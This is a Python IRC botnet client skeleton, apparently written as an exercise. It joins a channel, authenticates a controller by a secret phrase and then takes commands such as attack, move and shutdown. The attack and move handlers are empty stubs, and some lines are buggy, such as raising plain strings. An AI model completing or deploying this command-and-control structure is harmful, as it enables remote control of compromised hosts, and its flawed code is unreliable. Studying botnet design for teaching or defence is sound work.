import sys
import socket
import argparse



def send_PRIVMSG(s, message, channel, user="" ):
    if user == "":
        s.send(("PRIVMSG " + channel + " " + message + "\n").encode())
    else:
        s.send(("PRIVMSG " + user + " " + message + "\n").encode())

def recv_response(s):
    response = s.recv(256)
    response.decode()
    if response.find(b'PING') != -1 and type(response) != type(bytes):                      
        s.send(('PONG ' + response.split()[1] + '\r\n').encode()) 
    return response

def recv_PRIVMSG(s):
    response = recv_response(s)
    while response.find(b"PRIVMSG") == -1:
        response = recv_response(s)
    return response 

def connect(s, channel):
    
    try:
        i = 0
        nickname = "bot" + str(i) 
        nickname_check = False
        while(nickname_check == False):
            s.send(("NICK " + nickname + "\n").encode())
            s.send(("USER " + nickname +  " " + "*" + " " + "*" + " :This is a simple bot~!\n").encode())
            init_response = recv_response(s)
            if init_response.find(b"001") != -1:
                nickname_check = True
            else:
                i = i + 1
                nickname = "bot" + str(i) 
            print(init_response)
        s.send(("JOIN " + channel + "\n").encode())
        return nickname
    except Exception as err:
        print("Error: {}".format(err)) 


def receive_command(s, command, controller):
    global authenticity_confirmation
    try:
        command[0] = command[0].rstrip().replace(":", "")
        print(command)
        if command[0].lower() == "status":
            if len(command) > 1:
                raise("Too many arguments")
            pass
        elif command[0].lower() == "attack":
            pass
        elif command[0].lower() == "move":
            pass
        elif command[0].lower() == "quit":
            if len(command) > 1:
                raise("Too many arguments")
            else:
                authenticity_confirmation = False
        elif command[0].lower() == "shutdown":
            if len(command) > 1:
                raise("Too many arguments")
            else:
                ack = None
                while ack != "ack":
                    send_PRIVMSG(s, "shutting down", "", controller)
                    reply = recv_PRIVMSG(s)
                    reply = reply.decode().split("\r\n")
                    for i in reply:
                        if i.find("PRIVMSG") != -1:
                            response = i
                            break
                    ack = response[3]
                s.send(b"QUIT\n")
                sys.exit(0)
        else:
            print("Invalid command")
    except Exception as err:
        print("{}".format(err))


parser = argparse.ArgumentParser(description="Botnet program")
parser.add_argument("hostname", help="The host name of the irc server")
parser.add_argument("port", help="The port number of the irc server")
parser.add_argument("channel", help="The channel name of the irc server")
parser.add_argument("secret_phrase", help="The password to authenticate bot")
args = parser.parse_args()

hostname = args.hostname
port = int(args.port)
channel = "#" + args.channel
secret = args.secret_phrase

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((hostname, port))
print("Connecting to server={} on port={}".format(hostname, port))
nickname = connect(s, channel)
controller = ""

authenticity_confirmation = False
while True:
    reply = recv_PRIVMSG(s)
    reply = reply.decode().split("\r\n")
    for i in reply:
        if i.find("PRIVMSG") != -1:
            response = i
            break
    controller_parse = response.split("!")
    controller = controller_parse[0].replace(":", "")
    print("Found controller = ", controller)
    response = response.split(" ")
    if response[3].rstrip().replace(":", "") == secret:
        authenticity_confirmation = True
    while authenticity_confirmation:
        print("Secret Confirmed")
        reply = recv_PRIVMSG(s)
        reply = reply.decode().split("\r\n")
        for i in reply:
            if i.find("PRIVMSG") != -1:
                command_msg = i
                break
        command_msg = command_msg.split(" ")
        command = command_msg[3:]
        receive_command(s, command, controller)
        if authenticity_confirmation == False:
            print("Controller quiting....")
            break
